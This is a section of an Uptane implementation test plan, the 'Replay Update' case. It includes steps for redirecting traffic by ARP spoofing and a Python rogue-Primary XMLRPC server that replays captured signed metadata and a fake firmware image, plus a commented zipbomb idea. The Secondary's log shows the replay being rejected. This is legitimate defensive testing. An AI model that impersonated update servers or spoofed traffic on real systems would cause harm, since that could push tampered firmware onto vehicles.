# Uptane Implementation Test Plan
## 11. Replay Update
**Test Case** : Attempt to replay a previous downloaded update to the Uptane client.

**Test Steps** :   
1. Setup Test Computer   
 Setup a test computer to be able to communicate with both the Primary and the Uptane servers. Ensure this test computer has Python 3.5 or later installed.  

2. Perform an Update and Launch Attack  
Follow the tutorial on how to perform an update on a Secondary while monitoring the communication via Wireshark. Copy the responses sent from the Primary to the Secondary when the Secondary performs an update_cycle().
Afterward, remove the connectivity of the Primary and route traffic on the router destined for the Primary to the attacking machine (either add the rule manually on the router or ARP spoofing).
Ensure the attacking machine is listening on the same port as the Primary (port 30701) and is capable of handling the previously noted XMLRPC requests (i.e., get_time_attestation_for_ecu, get_metadata, update_exists_for_ecu, get_image, submit_ecu_manifest). Run the example server by running the following command:   
-python replay_update.py

Observe the output of the Secondary.  

3. Monitor Secondary Response  
Verify the response from the Secondary looks similar to the following.  
,,,
>>> ds.update_cycle()
   Timeserver attestation from Primary does not check out: This Secondary's nonce
   was not found. Not updating this Secondary's time this cycle.
   Verifying 'timestamp'. Requesting version: None
   Downloading:
   'file:////home/pi/workspace/uptane/temp_SecondarywSirN/unverified/director/meta
   data/timestamp.json'
   Downloaded 554 bytes out of an upper limit of 16384 bytes.
   Not decompressing
   file:////home/pi/workspace/uptane/temp_SecondarywSirN/unverified/director/metad
   ata/timestamp.json
   metadata_role: 'timestamp'
   'snapshot.json' up-to-date.
   'root.json' up-to-date.
   'targets.json' up-to-date.
   Verifying 'timestamp'. Requesting version: None
   Downloading:
   'file:////home/pi/workspace/uptane/temp_SecondarywSirN/unverified/imagerepo/met
   adata/timestamp.json'
   Downloaded 554 bytes out of an upper limit of 16384 bytes.
   Not decompressing
   file:////home/pi/workspace/uptane/temp_SecondarywSirN/unverified/imagerepo/meta
   data/timestamp.json
   metadata_role: 'timestamp'
   'snapshot.json' up-to-date.
   'root.json' up-to-date.
   'targets.json' up-to-date.
   'targets.json' up-to-date.
   'targets.json' up-to-date.
'targets.json' up-to-date.
   'targets.json' up-to-date.
   'targets.json' up-to-date.
   The file's 'sha256' hash is correct:
   '95a5f756380f43ba238e63fe314e63c9dd62967ff81b4d3e9ad7a0dec19db3c9'
   The file's 'sha512' hash is correct:
   '432c8788fc9480b07d8d78fcd7f1b35ab606854a5ddef24cc87ff7d4e54bb472b789bf43a1d143
   240c8a552ac37237a0ea74c2e09c7591807d9bfd40bbc30960'
   [2018.02.09 14:55:44UTC] [Secondary] DEBUG [Secondary.py:validate_image():682]
   Delivered target file has been fully validated:
   '/home/pi/workspace/uptane/temp_SecondarywSirN/unverified_targets/Secondary_upd
   ate.img'
   We already have installed the firmware that the Director wants us to install.
   Image: 'Secondary_update.img'
,,,


As seen above, the Secondary realizes the timeserver attestation does not contain the Secondary’s nonce, so it does not update it’s time. However, the Secondary continues to verify the metadata, which implies, it’s update process was not hindered by a non-valid timeserver attestation response. Ultimately, the Secondary recognizes that its current installed image matches the image our rogue Primary was attempting to send, and does not attempt to install our replayed update, thus this test is a pass.

**Test Scripts** :  replay_update.py  

import base64
   import sys
   from xmlrpc.server import SimpleXMLRPCServer
   from xmlrpc.server import SimpleXMLRPCRequestHandler
   class RequestHandler(SimpleXMLRPCRequestHandler):
     rpc_paths = ('/RPC2',)
   server = SimpleXMLRPCServer(("192.168.1.81", 30701),
   requestHandler=RequestHandler, allow_none=True)
   #Define a function and register the response
   def get_time_attestation_for_ecu(val1=False,val2=False,val3=False):
     response = {'signed': {'time': '2018-02-08T16:58:34Z', 'nonces':
   [1629811402]}, 'signatures':
   [{'keyid':'79c796d7e87389d1ebad04edce49faef611d139ee41ea9fb1931732afbfaac2e',
   'sig':'704c598ecc7f004705904a6a84dcaf2f1175e230f31c63bc4b2c086354c010663861a85e
   95988ebcb6af0bfcdddb775741ea748ef4bffb60276a5aad7a05a202',
   'method':'ed25519'}]}
     return response
   server.register_function(get_time_attestation_for_ecu,
         'get_time_attestation_for_ecu')
   #Define a function and register the response
   def get_metadata(val1=False,val2=False,val3=False):
     #response = with open('zipbomb.gz', 'rb') as f:
     #  f.read(
     with open('metadata_archive.zip','rb') as f:
       return f.read()
   server.register_function(get_metadata,
         'get_metadata')
   #Define a function and register the response
   def update_exists_for_ecu(val1=False,val2=False,val3=False):
 return True
   server.register_function(update_exists_for_ecu,
  'update_exists_for_ecu')
   #Define a function and register the response
   def get_image(val1=False,val2=False,val3=False):

response=['Secondary_update.img', b'Sec2nd update for SECONDARY_ECU_1']
  return response
server.register_function(get_image,
      'get_image')
#Define a function and register the response
def submit_ecu_manifest(val1=False,val2=False,val3=False,val4=False):
  return ''
server.register_function(submit_ecu_manifest,
      'submit_ecu_manifest')
try:
  server.serve_forever()
except KeyboardInterrupt:
  print("\nKeyboard interrupt.")
  sys.exit(0)
  ,,,

